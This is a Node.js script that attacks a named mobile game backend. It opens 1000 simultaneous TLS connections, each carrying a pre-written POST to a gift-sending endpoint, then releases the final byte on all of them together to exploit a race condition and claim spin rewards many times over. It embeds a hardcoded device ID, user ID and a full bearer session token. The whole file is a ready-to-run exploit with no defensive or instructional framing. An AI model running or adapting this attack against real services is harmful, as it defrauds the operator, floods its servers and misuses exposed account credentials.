const tls = require("tls");
const net = require("net");

var DeviceId = "06be855b1f11b601df75";
var SessionToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifQ.eyJkZXZpY2UiOnsiaWQiOiJkODFhZjJkOC03NDFmLTQyNDUtYjQxMi04ZDZkZDkzNWUwMDUifSwic2Vzc2lvbiI6eyJwbGF5ZXJJZCI6InJvcjQ3X19ja2ZiNzRmb2owNzMwN2JtaWY2OWU5Ynp0IiwiZXh0cmEiOnsicGxhdGZvcm0iOiJ1bmtub3duIiwicHJvZmlsZSI6IjNfNV9mYmFuZF9QQUJGYXN0ZXJCdWlsZFYxIn19LCJpYXQiOjE2MTY0MjE2OTYsImV4cCI6MTYxNjQ3OTI5Nn0.1f65IrJgSLtOLcsLCMNm19Nxx2qvRiXMVYsY42YcThI";
var UserId = "ror47__ckfb74foj07307bmif69e9bzt";


var max_connection = 1000;

    var options = {
        host: "vik-game.moonactive.net",
        port: 443
    }

    var sockets = [];
    var promises = [];
    var count = 0;
    var err = 0;
    for (var i = 0; i < max_connection; i++) {
        promises.push(new Promise((resolve, reject) => {
            sockets[i] = tls.connect(options, () => { });
            sockets[i].setEncoding("utf8");
            sockets[i].on("data", (data) => {
                var protocal = data.split("\r\n")[0]
                if (protocal == "HTTP/1.1 200 OK") {
                    console.log(" Hits: " + ++count);
                } else {
                    console.log(protocal, " Error: " + ++err);
                }
            });
            sockets[i].on("end", () => {
            });

            data = "Device%5Budid%5D=" + DeviceId + "&API_KEY=viki&API_SECRET=coin&collect_all=spins&reward=spins"
            sockets[i].write(
                "POST /api/v1/users/" + UserId + "/gifts/send HTTP/1.1\r\n" +
                "Host: vik-game.moonactive.net\r\n" +
                "Content-Length: " + (data.length + 1) + "\r\n" +
                "Content-Type: application/x-www-form-urlencoded\r\n" +
                "Authorization: Bearer " + SessionToken + "\r\n" +
                "X-CLIENT-VERSION: 2.5.243\r\n" +
                "Connection: close\r\n" +
                "\r\n" +
                data
            );
            resolve(true);
        }));
    }

    var responsePromise = Promise.all(promises).then((values) => {
        for (var i = 0; i < max_connection; i++) {
            new Promise((resolve, reject) => {
                sockets[i].write("&");
                resolve(true);
            });
        }
    });
